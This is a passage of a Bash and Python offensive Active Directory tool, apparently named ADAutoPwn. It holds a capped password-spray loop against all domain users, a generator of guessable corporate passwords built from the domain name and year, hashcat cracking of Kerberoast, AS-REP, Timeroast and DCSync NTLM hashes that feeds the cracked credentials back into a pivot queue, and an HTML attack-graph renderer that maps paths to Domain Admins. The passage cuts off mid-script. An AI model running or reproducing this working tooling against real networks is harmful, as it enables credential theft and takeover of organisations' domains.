        SPRAYED[__GEN__]=1
        section "PASSWORD SPRAY · domain-focused dictionary (--spray)"
        warn "Lockout risk: each candidate = 1 bad attempt per user. Capping to the safest few."
        local cap=6 i=0
        while IFS= read -r pw && (( i < cap )); do
            [[ -z "$pw" || -n "${SPRAYED[$pw]:-}" ]] && continue
            SPRAYED["$pw"]=1; i=$((i+1))
            subsection "[$i/$cap] Spraying '$pw'"
            run "spray '$pw' × users_all.txt"
            _spray_one "$pw"
        done <"$DOMAIN_WL"
        info "Generated spray capped at $cap candidates to protect accounts (raise manually if policy allows)"
    fi
}

# ===========================================================================
#  DOMAIN-FOCUSED WORDLIST  —  high-probability candidates from the target
#  (used first for OFFLINE cracking; optionally for capped online spray)
# ===========================================================================
gen_domain_wordlist() {
    local out="$OUTDIR/domain_wordlist.txt"
    [[ -s "$out" ]] && { DOMAIN_WL="$out"; return; }
    [[ -z "$DOMAIN" ]] && return
    local short="${DOMAIN%%.*}"                       # corp.local -> corp
    # Dynamic year window: current_year-2 .. current_year+1. Always relative to
    # `date` (no hardcoded years to rot), and forward-looking by one so a box
    # deployed/clocked slightly ahead is still covered.
    local yr; yr=$(date +%Y)
    local -a years=(); local d; for d in -2 -1 0 1; do years+=("$((yr+d))"); done
    local -a bases=("$short" "${short^}" "${short^^}")
    [[ -n "$DC_HOST" ]] && bases+=("$DC_HOST" "${DC_HOST^}")
    local -a seasons=(Spring Summer Autumn Fall Winter)
    local -a suffix=("" "1" "12" "123" "1234" "!" "123!" "@123" "#1" "01")
    local y; for y in "${years[@]}"; do suffix+=("$y" "${y}!"); done
    { for b in "${bases[@]}"; do for s in "${suffix[@]}"; do echo "${b}${s}"; done; done
      for se in "${seasons[@]}"; do for y in "${years[@]}"; do
          echo "${se}${y}"; echo "${se}${y}!"; echo "${se}@${y}"; done; done
      # Corporate defaults, with the year-bearing ones expanded across the window
      for y in "${years[@]}"; do
          echo "Welcome${y}"; echo "Welcome${y}!"; echo "Welcome@${y}"
          echo "Password${y}"; echo "Password${y}!"
          echo "${short^}${y}"; echo "${short^}${y}!"; echo "${short^}@${y}"; done
      printf '%s\n' Welcome1 Welcome1! Welcome123 Welcome123! Password1 Password1! \
          Password123 Password123! P@ssw0rd 'P@ssw0rd!' 'P@ssw0rd123' Changeme123 \
          Changeme123! Letmein123! Summer123! Company123! Admin123! Qwerty123!
    } | sort -u >"$out"
    DOMAIN_WL="$out"
    ok "Domain-focused wordlist generated → $(wc -l <"$out") candidates (domain_wordlist.txt)"
}

# ===========================================================================
#  OFFLINE CRACKING  (hashcat + wordlist)
# ===========================================================================
crack_hashes() {
    local file="$1" mode="$2" label="$3"
    [[ ! -s "$file" ]] && return

    # Cross-iteration dedup: the pivot loop re-roasts the same SPN/AS-REP accounts
    # (and re-dumps the same NTLM hashes) every pass. Cracking them again is pure
    # waste — same hash, same wordlist. Key by ACCOUNT for Kerberos hashes (the
    # encrypted blob carries a fresh nonce each request, so the hash STRING differs
    # even though the account/password don't), and by the hash line for NTLM.
    local work line k; work="$(mktemp)"
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        case "$label" in
            AS-REP)     k=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@:]+' <<<"$line" | head -1) ;;
            Kerberoast) k=$(grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+'  <<<"$line" | head -1) ;;
            Timeroast)  k=$(grep -oP '\$sntp-ms\$[^$]*\$\K[^$: ]+'     <<<"$line" | head -1) ;;
            *)          k="$line" ;;
        esac
        [[ -z "$k" ]] && k="$line"
        k="${label}::${k}"
        [[ -n "${TRIED_HASHES[$k]:-}" ]] && continue
        TRIED_HASHES["$k"]=1
        printf '%s\n' "$line" >>"$work"
    done <"$file"
    if [[ ! -s "$work" ]]; then
        rm -f "$work"
        info "$label hashes already cracked/attempted in an earlier pass → skipping re-crack"
        return
    fi

    subsection "Cracking $label (hashcat -m $mode)"
    # 1) domain-focused candidates first (fast, high hit-rate), then rockyou
    if [[ -s "$DOMAIN_WL" ]]; then
        run "hashcat -m $mode <file> domain_wordlist.txt -O"
        hashcat -m "$mode" "$work" "$DOMAIN_WL" -O 2>&1 | tee -a "$LOGFILE"
    fi
    if [[ -f "$WORDLIST" ]]; then
        run "hashcat -m $mode <file> $WORDLIST -O"
        hashcat -m "$mode" "$work" "$WORDLIST" -O 2>&1 | tee -a "$LOGFILE"
    elif [[ ! -s "$DOMAIN_WL" ]]; then
        warn "No wordlist available, skipping $label cracking"; rm -f "$work"; return
    fi
    local cracked; cracked=$(hashcat -m "$mode" "$work" --show 2>/dev/null); rm -f "$work"
    if [[ -n "$cracked" ]]; then
        loot "★★★ CRACKED CREDENTIALS ($label) ★★★"
        echo "$cracked" | while IFS= read -r line; do echo -e "      ${C_GREEN}${C_BOLD}$line${C_RESET}"; done
        echo "$cracked" >>"$OUTDIR/cracked_passwords.txt"
        # Feed cracked plaintext back into the pivot queue (user:password)
        while IFS= read -r line; do
            local pw user
            pw="${line##*:}"
            add_secret "$pw" "cracked $label hash"
            case "$label" in
                AS-REP)     user=$(echo "$line" | grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+') ;;
                Kerberoast) user=$(echo "$line" | grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+') ;;
                Timeroast)  user=$(echo "$line" | grep -oP '\$sntp-ms\$[^$]*\$\K[^$: ]+' | head -1) ;;
                NTLM)       # map NT hash back to a username via the DCSync output
                    local nt="${line%%:*}"
                    user=$(grep -iE ":${nt}:::" "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f1) ;;
            esac
            [[ -n "$user" && -n "$pw" ]] && queue_cred "$user" "$pw" "" "$label cracked"
        done <<<"$cracked"
    else
        info "Nothing cracked for $label with this wordlist"
    fi
}

# ===========================================================================
#  BLOODHOUND → INTERACTIVE GRAPH  (self-contained, offline graph.html)
#  Parses the collected BloodHound zip, builds nodes/edges, highlights attack
#  paths to Domain Admins / DC, and embeds ready-to-run Linux+Windows abuse
#  commands for every exploitable ACL edge — like BloodHound, but prettier.
# ===========================================================================
# Core renderer: reads env BH_ZIP / BH_HTML / OWNED_FILE / GDOMAIN / GDC and
# writes a self-contained graph.html. Shared by the full run and --graph mode.
render_graph_py() {
    python3 - <<'PYEOF'
import os, sys, json, zipfile
from collections import defaultdict, deque

ZIP   = os.environ.get("BH_ZIP","")
HTML  = os.environ.get("BH_HTML","graph.html")
OWNED = os.environ.get("OWNED_FILE","")
DOM   = (os.environ.get("GDOMAIN","domain.local") or "domain.local")
DC    = (os.environ.get("GDC","") or DOM)          # DC DNS name (for -target/-dc-host/--host)
DCIP  = (os.environ.get("GDCIP","") or DC)          # DC IP (for -dc-ip); falls back to the name

HTML_TEMPLATE = r'''<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ADAutoPwn · Attack Graph</title>
<style>
  :root{
    --user:#5aa7ff; --group:#f5c84c; --computer:#ff7676; --domain:#47d7a0;
    --gpo:#b69cff; --ou:#74d6f7; --base:#9aa8bb;
    --path:#ff4d7d; --gold:#ffd45a; --owned:#ff4a4a;
    --bg0:#090d13; --bg1:#101722; --ink:#edf4fb; --muted:#9aa8ba;
    --glass:rgba(15,21,31,.78); --line:rgba(255,255,255,.10);
  }
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;overflow:hidden;font-family:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
    color:var(--ink);background:
      radial-gradient(1200px 800px at 78% -10%,rgba(54,211,153,.10),transparent 60%),
      radial-gradient(1000px 700px at -10% 110%,rgba(78,161,255,.12),transparent 55%),
      linear-gradient(160deg,var(--bg0),var(--bg1));}
  #c{position:fixed;inset:0;display:block;cursor:grab}
  #c.grab{cursor:grabbing}
  .glass{background:var(--glass);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
    border:1px solid var(--line);border-radius:16px;
    box-shadow:0 10px 40px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.05)}
  #header{position:fixed;top:18px;left:20px;padding:13px 17px;z-index:5}
  #header h1{font-size:16px;font-weight:800;letter-spacing:.2px;color:#f6fbff}
  #header .sub{font-size:11px;color:var(--muted);margin-top:3px;letter-spacing:.4px}
  #header .sub b{color:#cfe8ff;font-weight:600}
  #search{position:fixed;top:18px;right:20px;z-index:5;display:flex;gap:8px;align-items:center;padding:8px 10px}
  #search input{background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:10px;color:var(--ink);
    padding:8px 12px;font-size:13px;width:220px;outline:none;transition:.2s}
  #search input:focus{border-color:rgba(125,255,196,.5);box-shadow:0 0 0 3px rgba(125,255,196,.12)}
  #search .ico{font-size:13px;color:var(--muted)}
  #search #reset{cursor:pointer;color:var(--muted);font-size:16px;padding:2px 7px;border-radius:8px;transition:.15s;user-select:none}
  #search #reset:hover{background:rgba(255,255,255,.08);color:#7dffc4}
  #results{position:fixed;top:62px;right:20px;z-index:6;width:262px;max-height:320px;overflow-y:auto;display:none;
    background:var(--glass);backdrop-filter:blur(14px);border:1px solid var(--line);border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,.45)}
  #results.show{display:block}
  #results .r{padding:8px 12px;font-size:12.5px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.04);display:flex;align-items:center;gap:8px}
  #results .r:hover,#results .r.sel{background:rgba(125,255,196,.10)}
  #results .r .d{width:9px;height:9px;border-radius:50%;flex:0 0 auto;box-shadow:0 0 8px currentColor}
  #results .r small{color:var(--muted);margin-left:auto}
  #dock{position:fixed;top:120px;left:20px;z-index:5;display:flex;flex-direction:column;gap:6px;max-width:210px}
  #dock .qlabel{font-size:9.5px;letter-spacing:1.6px;color:#5b6677;margin:8px 2px 1px;font-weight:700}
  .tab.active{border-color:rgba(255,212,90,.68);color:#ffd45a;background:rgba(255,212,90,.08)}
  .tab{cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;color:var(--ink);text-align:left;
    background:var(--glass);backdrop-filter:blur(14px);border:1px solid var(--line);border-radius:11px;padding:9px 13px;
    box-shadow:0 8px 26px rgba(0,0,0,.4);transition:.15s}
  .tab:hover{border-color:rgba(125,255,196,.45);color:#9bf3cf}
  .tab.on{border-color:rgba(255,45,109,.6);color:#ff8fb0}
  #findings{position:fixed;top:120px;left:170px;z-index:6;width:340px;max-height:calc(100% - 150px);
    display:none;flex-direction:column;overflow:hidden}
  #findings.show{display:flex}
  #findings .fhead{display:flex;align-items:center;justify-content:space-between;padding:13px 15px;border-bottom:1px solid var(--line);font-weight:700;font-size:13px}
  #findings .fx{cursor:pointer;color:var(--muted);font-size:18px;line-height:1}
  #findings .fx:hover{color:#fff}
  #findings #ffilter{margin:10px 12px;background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:9px;color:var(--ink);padding:7px 11px;font-size:12px;outline:none}
  #findings .flist{overflow-y:auto;padding:0 8px 12px}
  #findings .fi{padding:9px 11px;border-radius:9px;cursor:pointer;font-size:12px;margin:3px 0;border:1px solid transparent;transition:.12s}
  #findings .fi:hover{background:rgba(255,255,255,.05);border-color:var(--line)}
  #findings .fi .rt{color:#ff8fb0;font-weight:700}
  #findings .fi .src{color:#cfe8ff}.fi .dst{color:#ffd24a}
  #findings .fg{font-size:10px;letter-spacing:1px;text-transform:uppercase;color:#7dffc4;margin:12px 6px 4px;font-weight:700}
  #findings .flist::-webkit-scrollbar{width:8px}#findings .flist::-webkit-scrollbar-thumb{background:rgba(255,255,255,.12);border-radius:8px}
  #legend{position:fixed;bottom:18px;left:20px;z-index:5;padding:12px 14px;font-size:12px}
  #legend .row{display:flex;align-items:center;gap:8px;margin:5px 0;color:var(--muted)}
  #legend .dot{width:11px;height:11px;border-radius:50%;box-shadow:0 0 10px currentColor}
  #legend .ln{width:18px;height:0;border-top:3px solid var(--path);box-shadow:0 0 8px var(--path)}
  #hint{position:fixed;bottom:18px;right:20px;z-index:5;font-size:11px;color:var(--muted);
    padding:9px 12px;letter-spacing:.3px}
  #tip{position:fixed;z-index:9;pointer-events:none;padding:6px 10px;border-radius:8px;font-size:12px;
    background:rgba(8,11,18,.92);border:1px solid var(--line);color:#e8f0fb;display:none;max-width:280px}
  #panel{position:fixed;top:0;right:0;height:100%;width:380px;z-index:8;transform:translateX(105%);
    transition:transform .32s cubic-bezier(.22,1,.36,1);display:flex;flex-direction:column;
    border-radius:18px 0 0 18px;overflow:hidden}
  #panel.open{transform:translateX(0)}
  #panel .head{padding:20px 20px 14px;border-bottom:1px solid var(--line);position:relative}
  #panel .ptype{font-size:11px;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted)}
  #panel .pname{font-size:18px;font-weight:800;margin-top:5px;word-break:break-all;line-height:1.3}
  #panel .badges{margin-top:10px;display:flex;gap:7px;flex-wrap:wrap}
  .badge{font-size:10px;font-weight:700;letter-spacing:.4px;padding:4px 9px;border-radius:999px;border:1px solid var(--line)}
  .badge.hv{color:#1a1300;background:linear-gradient(90deg,#ffe08a,#ffc107);border:none}
  .badge.owned{color:#fff;background:linear-gradient(90deg,#ff5b5b,#c81e1e);border:none}
  .badge.t{color:var(--ink);background:rgba(255,255,255,.06)}
  .badge.own-toggle{cursor:pointer;color:#ff9db0;border-color:rgba(255,59,59,.5);user-select:none}
  .badge.own-toggle:hover{background:rgba(255,59,59,.15);color:#fff}
  #panel .close{position:absolute;top:16px;right:16px;cursor:pointer;color:var(--muted);font-size:20px;
    width:30px;height:30px;line-height:28px;text-align:center;border-radius:8px;transition:.15s}
  #panel .close:hover{background:rgba(255,255,255,.08);color:#fff}
  #panel .body{padding:16px 18px 30px;overflow-y:auto;flex:1}
  #panel .body::-webkit-scrollbar{width:8px}#panel .body::-webkit-scrollbar-thumb{background:rgba(255,255,255,.12);border-radius:8px}
  .sect{font-size:11px;letter-spacing:1.2px;text-transform:uppercase;color:#7dffc4;margin:18px 0 9px;font-weight:700}
  .stat{display:flex;justify-content:space-between;font-size:12.5px;color:var(--muted);padding:3px 0}
  .stat b{color:var(--ink);font-weight:600}
  .edge{font-size:12px;color:var(--muted);padding:4px 0;display:flex;gap:7px;align-items:center}
  .edge .rt{color:#ffd24a;font-weight:600}
  .abuse{border:1px solid var(--line);border-radius:12px;margin:11px 0;overflow:hidden;background:rgba(0,0,0,.22)}
  .abuse .ah{padding:10px 12px;font-size:12.5px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;
    background:linear-gradient(90deg,rgba(255,45,109,.16),transparent)}
  .abuse .ah .arrow{color:var(--path);font-weight:800}
  .abuse .ah .src{color:#cfe8ff;font-weight:700}.abuse .ah .dst{color:#ffd24a;font-weight:700}
  .cmd{border-top:1px solid var(--line)}
  .cmd .ch{display:flex;align-items:center;gap:8px;padding:8px 12px 4px;font-size:11px;color:var(--muted)}
  .os{font-size:9.5px;font-weight:800;letter-spacing:.5px;padding:2px 7px;border-radius:6px}
  .os.linux{background:rgba(78,161,255,.18);color:#9fcbff}
  .os.win{background:rgba(125,255,196,.16);color:#9bf3cf}
  .cmd pre{margin:0;padding:6px 12px 12px;font-family:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace;
    font-size:11.5px;line-height:1.55;color:#e8f0fb;white-space:pre-wrap;word-break:break-all;cursor:pointer;position:relative}
  .cmd pre:hover{color:#fff}
  .cmd .cp{float:right;font-size:9.5px;color:var(--muted);border:1px solid var(--line);border-radius:6px;padding:1px 6px;margin-left:8px}
  .empty{color:var(--muted);font-size:12.5px;font-style:italic;padding:8px 0}
  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);z-index:20;
    padding:9px 16px;border-radius:10px;font-size:12.5px;background:rgba(20,28,40,.95);border:1px solid var(--line);
    color:#9bf3cf;opacity:0;transition:.25s;pointer-events:none}
  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
</style>
</head>
<body>
<canvas id="c"></canvas>
<div id="empty" style="position:fixed;inset:0;z-index:1;display:flex;align-items:center;justify-content:center;pointer-events:none">
  <div style="text-align:center;max-width:520px;padding:26px 30px;color:#9aa7b8;line-height:1.7">
    <div style="font-size:30px;margin-bottom:10px">&#128375;&#65039;</div>
    <div style="font-size:15px;color:#cfe8ff;font-weight:600;margin-bottom:8px">The graph starts empty — you drive it</div>
    <div style="font-size:13px">
      &#128269; <b style="color:#dbe6f3">Search</b> a user/computer, or pick a <b style="color:#dbe6f3">VIEW</b> on the left.<br>
      Click a node to expand what hangs off it.<br>
      <span style="color:#ff8a8a">&#9760; Right-click a node (or press <b>O</b>) to mark it owned</span> — then
      <b style="color:#ffd24a">&rarr; Domain Admins</b> / <b style="color:#ffd24a">&rarr; DC</b> map your paths.
    </div>
  </div>
</div>
<div id="header" class="glass">
  <h1>ADAutoPwn · Attack Graph</h1>
  <div class="sub" id="meta"></div>
  <div class="sub" id="count" style="color:#7dffc4"></div>
</div>
<div id="search" class="glass">
  <span class="ico">&#128269;</span>
  <input id="q" placeholder="Search any node…" autocomplete="off" spellcheck="false">
  <span id="reset" title="Reset to attack-path view">&#8635;</span>
</div>
<div id="results"></div>

<div id="dock">
  <div class="qlabel">VIEW</div>
  <button class="tab q" data-q="owned" title="What you control">&#9760; Owned</button>
  <button class="tab q" data-q="da"    title="Shortest paths from owned to Domain Admins">&#128081; &rarr; Domain Admins</button>
  <button class="tab q" data-q="dc"    title="Shortest paths from owned to a Domain Controller">&#128421;&#65039; &rarr; DC</button>
  <button class="tab q" data-q="hv"    title="High-value targets">&#11088; High value</button>
  <button class="tab q" data-q="all"   title="Everything (can be busy)">&#128301; Everything</button>
  <div class="qlabel">LIST</div>
  <button id="btnFind" class="tab" title="Who can abuse what">&#9876; Abusable ACLs</button>
  <button id="btnUsers" class="tab" title="All users">&#128100; Users</button>
</div>
<div id="findings" class="glass">
  <div class="fhead"><span id="findTitle">Attack paths</span><span class="fx" id="findClose">&times;</span></div>
  <input id="ffilter" placeholder="filter…" autocomplete="off" spellcheck="false">
  <div class="flist" id="flist"></div>
</div>

<div id="legend" class="glass">
  <div class="row"><span class="dot" style="color:var(--user)"></span>User</div>
  <div class="row"><span class="dot" style="color:var(--group)"></span>Group</div>
  <div class="row"><span class="dot" style="color:var(--computer)"></span>Computer</div>
  <div class="row"><span class="dot" style="color:var(--domain)"></span>Domain</div>
  <div class="row"><span class="ln"></span>Attack path → DA / DC</div>
  <div class="row"><span style="color:var(--gold)">&#9733;</span>High value &nbsp; <span style="color:var(--owned)">&#9760;</span>Owned</div>
</div>
<div id="hint" class="glass">scroll = zoom · drag = move · click = expand · right-click / O = mark owned · search = find anything</div>
<div id="tip"></div>
<div id="panel" class="glass">
  <div class="head">
    <div class="close" id="pclose">&times;</div>
    <div class="ptype" id="ptype"></div>
    <div class="pname" id="pname"></div>
    <div class="badges" id="pbadges"></div>
  </div>
  <div class="body" id="pbody"></div>
</div>
<div class="toast" id="toast">copied</div>
<script>
const DATA   = __DATA__;
const ABUSE  = __ABUSE__;
const DOMAIN = __DOMAIN__;
const DCHOST = __DC__;
const DCIP   = __DCIP__;
const META   = __META__;

const COLORS={User:"#4ea1ff",Group:"#ffca3a",Computer:"#ff6b6b",Domain:"#36d399",
  GPO:"#b794f6",OU:"#7dd3fc",Container:"#7dd3fc",Base:"#94a3b8"};
const N=DATA.nodes, E=DATA.edges;
document.getElementById("meta").innerHTML = META.replace(/·/g,"&middot;");

// adjacency over ALL nodes (data stays complete so search can reach anything)
const nb=N.map(()=>new Set());
const incE=N.map(()=>[]);                 // incident edge indices per node
E.forEach((e,i)=>{nb[e.s].add(e.t);nb[e.t].add(e.s);incE[e.s].push(i);incE[e.t].push(i);});
const deg=N.map((_,i)=>incE[i].length);
N.forEach((n,i)=>{n._i=i; n.r=(n.type==="Domain"?14:n.hv?10:7)+Math.min(deg[i]*0.22,5);
  n.x=0; n.y=0; n.vx=0; n.vy=0; n.fx=null; n.fy=null; n.pinned=false;});

// Directed adjacency (s → t) for shortest-path queries, like BloodHound.
const outAdj=N.map(()=>[]), inAdj=N.map(()=>[]);
E.forEach((e,i)=>{ outAdj[e.s].push([e.t,i]); inAdj[e.t].push([e.s,i]); });
// owned is mutable: the operator marks/unmarks nodes live in the graph
// (right-click a node, press "o", or use the panel button). Any --owned seed
// from the scan just pre-fills it; it is NOT required.
let ownedIdx=[...N.keys()].filter(i=>N[i].owned);
function recomputeOwned(){ ownedIdx=[...N.keys()].filter(i=>N[i].owned); }
const hvIdx=[...N.keys()].filter(i=>N[i].hv);
const _U=s=>(s||"").toUpperCase();
const _dcShort=_U(DCHOST).split(".")[0];
const daSet=new Set([...N.keys()].filter(i=>N[i].type!=="User" &&
  ["DOMAIN ADMINS","ENTERPRISE ADMINS","ADMINISTRATORS","SCHEMA ADMINS"].some(w=>_U(N[i].label).includes(w))));
const dcSet=new Set([...N.keys()].filter(i=>
  _U(N[i].label).includes("DOMAIN CONTROLLERS") ||
  (N[i].type==="Computer" && (N[i].hv || (_dcShort && _U(N[i].label).startsWith(_dcShort))))));
const PATHSET=new Set();   // edge indices on the currently-displayed attack path

// shortest paths from owned nodes to a target set (union); fall back to the
// targets + their direct attackers when nothing is owned yet.
function pathsTo(targets){
  const nodes=new Set(), edges=new Set();
  if(!ownedIdx.length){ targets.forEach(t=>{ nodes.add(t);
    inAdj[t].forEach(([s,ei])=>{ nodes.add(s); edges.add(ei); }); }); return {nodes,edges}; }
  ownedIdx.forEach(start=>{
    const prev=new Map([[start,-1]]), pe=new Map(); const q=[start]; let hit=-1;
    for(let h=0; h<q.length && hit<0; h++){ const u=q[h];
      if(targets.has(u) && u!==start){ hit=u; break; }
      for(const [v,ei] of outAdj[u]) if(!prev.has(v)){ prev.set(v,u); pe.set(v,ei); q.push(v); } }
    if(hit>=0){ let nd=hit; nodes.add(nd);
      while(prev.get(nd)!==-1){ edges.add(pe.get(nd)); nd=prev.get(nd); nodes.add(nd); } }
  });
  ownedIdx.forEach(i=>nodes.add(i));
  return {nodes,edges};
}

// ---- VISIBLE SET: BloodHound-style. Start tiny (just what you own) and let
// the operator pick a VIEW (→ Domain Admins, → DC, High value) or search/expand.
const vis=new Set();
let visArr=[], VE=[], curView="owned";
function refresh(){ visArr=[...vis]; const s=new Set();
  visArr.forEach(i=>incE[i].forEach(ei=>{const e=E[ei]; if(vis.has(e.s)&&vis.has(e.t))s.add(ei);}));
  VE=[...s]; updateCount(); if(typeof updateHint==="function") updateHint(); }
function placeAround(anchor, nodes){
  const a=N[anchor], list=[...nodes].filter(i=>i!==anchor && !N[i].pinned);
  const base=120+Math.min(list.length*9,260);
  list.forEach((i,k)=>{
    const n=N[i];
    if(n.x || n.y) return;
    const ang=(k/list.length)*Math.PI*2 + hash01(n.id||n.label)*0.8;
    const r=base + (k%4)*48;
    n.x=a.x+Math.cos(ang)*r; n.y=a.y+Math.sin(ang)*r;
    n.vx=0; n.vy=0; n.fx=null; n.fy=null;
  });
}
function expand(i){
  const before=new Set(vis);
  vis.add(i); nb[i].forEach(j=>vis.add(j));
  const added=[...vis].filter(j=>!before.has(j));
  placeAround(i, added);
  refresh(); requestDraw();
}

function hash01(s){ let h=2166136261; s=(s||"")+"";
  for(let i=0;i<s.length;i++){ h^=s.charCodeAt(i); h=Math.imul(h,16777619); }
  return ((h>>>0)%100000)/100000;
}
function seedVisible(q){
  const arr=[...vis];
  const buckets={Domain:[],Computer:[],Group:[],User:[],GPO:[],OU:[],Container:[],Base:[]};
  arr.forEach(i=>(buckets[N[i].type]||buckets.Base).push(i));
  Object.values(buckets).forEach(a=>a.sort((x,y)=>deg[y]-deg[x] || (N[x].label||"").localeCompare(N[y].label||"")));
  const centers={
    Domain:[0,-260],Computer:[360,-60],Group:[-360,-40],User:[0,260],
    GPO:[-520,260],OU:[520,260],Container:[520,260],Base:[0,0]
  };
  const spread=Math.max(120,Math.min(420,80+arr.length*1.8));
  Object.entries(buckets).forEach(([type,list])=>{
    const [cx,cy]=centers[type]||centers.Base;
    list.forEach((i,k)=>{
      const n=N[i]; if(n.pinned) return;
      const ring=Math.floor(Math.sqrt(k));
      const pos=k-ring*ring;
      const per=Math.max(1,ring*2+1);
      const a=(pos/per)*Math.PI*2 + hash01(n.id||n.label)*0.9;
      const r=ring*58 + hash01(n.label)*spread*0.22;
      n.x=cx+Math.cos(a)*r; n.y=cy+Math.sin(a)*r; n.vx=0; n.vy=0; n.fx=null; n.fy=null;
    });
  });
}

// Switch the displayed query/view. Reseeds positions for a clean layout.
function applyView(q){
  curView=q; vis.clear(); PATHSET.clear();
  if(q==="none"){ /* deliberately empty — the boot state */ }
  else if(q==="owned"){ ownedIdx.forEach(i=>{ vis.add(i); nb[i].forEach(j=>vis.add(j)); }); }
  else if(q==="hv"){ hvIdx.forEach(i=>vis.add(i)); }
  else if(q==="all"){ N.forEach((_,i)=>vis.add(i)); }
  else { const tgt=(q==="dc")?dcSet:daSet; const r=pathsTo(tgt);
         r.nodes.forEach(i=>vis.add(i)); r.edges.forEach(e=>PATHSET.add(e)); tgt.forEach(t=>vis.add(t)); }
  // For DA/DC/High-value, never leave the operator staring at a blank canvas.
  // For "none" (boot) and "owned" we intentionally allow an empty set — owned is
  // whatever the operator has marked, and an empty graph is the desired start.
  if(vis.size<1 && q!=="none" && q!=="owned"){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,15).forEach(i=>vis.add(i)); }
  [...vis].forEach(i=>{N[i].pinned=false; N[i].fx=N[i].fy=null;});
  seedVisible(q);
  refresh(); if(typeof select==="function") select(-1);
  document.querySelectorAll('#dock .q').forEach(b=>b.classList.toggle('active', b.dataset.q===q));
  if(typeof updateHint==="function") updateHint(q);
  if(typeof warmup==="function") warmup();
}
// NOTE: do NOT call applyView() here. select(-1) (reached via applyView)
// assigns to `let sel`, which is still in its temporal dead zone at this
// point in parsing → a ReferenceError would abort the entire script and
// leave a blank canvas. The boot block at the bottom calls applyView().

const cv=document.getElementById("c"), ctx=cv.getContext("2d");
let W=0,Hh=0,DPR=Math.min(window.devicePixelRatio||1,2);
function resize(){W=innerWidth;Hh=innerHeight;cv.width=W*DPR;cv.height=Hh*DPR;cv.style.width=W+"px";cv.style.height=Hh+"px";ctx.setTransform(DPR,0,0,DPR,0,0);requestDraw();}
addEventListener("resize",resize);

let scale=1, tx=0, ty=0;
function toScreen(x,y){return [x*scale+tx, y*scale+ty];}
function toWorld(px,py){return [(px-tx)/scale,(py-ty)/scale];}

// ---- render-on-demand: draw one frame only when state changes ----------------
let drawQueued=false;
function requestDraw(){ if(drawQueued)return; drawQueued=true; requestAnimationFrame(()=>{drawQueued=false; draw();}); }

let hover=-1, sel=-1;
function draw(){
  ctx.clearRect(0,0,W,Hh);
  const active = sel>=0?sel:hover;
  const lit = active>=0 ? nb[active] : null;

  VE.forEach(ei=>{
    const e=E[ei], a=N[e.s], b=N[e.t];
    const [ax,ay]=toScreen(a.x,a.y),[bx,by]=toScreen(b.x,b.y);
    const rel = active>=0 && (e.s===active||e.t===active);
    const onp = PATHSET.size ? PATHSET.has(ei) : e.p;   // view path, else python path
    let col, w, glow=0;
    if(onp){col="rgba(255,45,109,.92)";w=2.1;glow=10;}
    else if(rel){col="rgba(159,203,255,.85)";w=1.7;glow=5;}
    else if(active>=0){col="rgba(120,130,150,.06)";w=1;}
    else {col="rgba(130,142,165,.22)";w=1;}
    const mx=(ax+bx)/2, my=(ay+by)/2, dx=bx-ax, dy=by-ay;
    const cx=mx-dy*0.12, cy=my+dx*0.12;
    ctx.beginPath(); ctx.moveTo(ax,ay); ctx.quadraticCurveTo(cx,cy,bx,by);
    ctx.strokeStyle=col; ctx.lineWidth=w;
    ctx.shadowBlur=glow; ctx.shadowColor=onp?"#ff2d6d":"#9fcbff";
    ctx.stroke(); ctx.shadowBlur=0;
    if(onp||rel){const ang=Math.atan2(by-cy,bx-cx), r=N[e.t].r+3;
      const ex=bx-Math.cos(ang)*r, ey=by-Math.sin(ang)*r, s=6;
      ctx.beginPath(); ctx.moveTo(ex,ey);
      ctx.lineTo(ex-Math.cos(ang-0.4)*s,ey-Math.sin(ang-0.4)*s);
      ctx.lineTo(ex-Math.cos(ang+0.4)*s,ey-Math.sin(ang+0.4)*s);
      ctx.closePath(); ctx.fillStyle=col; ctx.fill();}
  });

  visArr.forEach(i=>{
    const n=N[i]; const [x,y]=toScreen(n.x,n.y), r=n.r;
    const dim = active>=0 && i!==active && !(lit&&lit.has(i));
    const col=COLORS[n.type]||COLORS.Base;
    ctx.globalAlpha = dim?0.16:1;
    ctx.beginPath(); ctx.arc(x,y,r,0,7);
    ctx.shadowBlur = dim?0:(n.p?16:10); ctx.shadowColor=col;
    ctx.fillStyle=col; ctx.fill(); ctx.shadowBlur=0;
    ctx.beginPath(); ctx.arc(x-r*0.3,y-r*0.3,r*0.42,0,7);
    ctx.fillStyle="rgba(255,255,255,.35)"; ctx.fill();
    ctx.lineWidth=1.3; ctx.strokeStyle="rgba(0,0,0,.5)";
    ctx.beginPath(); ctx.arc(x,y,r,0,7); ctx.stroke();
    if(n.hv && !dim){ctx.beginPath(); ctx.arc(x,y,r+4,0,7);
      ctx.strokeStyle="rgba(255,210,74,.9)"; ctx.lineWidth=2;
      ctx.shadowBlur=8; ctx.shadowColor="#ffd24a"; ctx.stroke(); ctx.shadowBlur=0;}
    if(n.owned && !dim){ctx.beginPath(); ctx.arc(x,y,r+(n.hv?8:3),0,7);
      ctx.strokeStyle="#ff3b3b"; ctx.lineWidth=2; ctx.stroke();
      ctx.font="11px sans-serif"; ctx.fillStyle="#ff5b5b"; ctx.textAlign="center";
      ctx.fillText("☠", x, y-r-(n.hv?10:5));}
    if((scale>0.85 || i===active || (lit&&lit.has(i)) || n.hv || n.owned) && !dim){
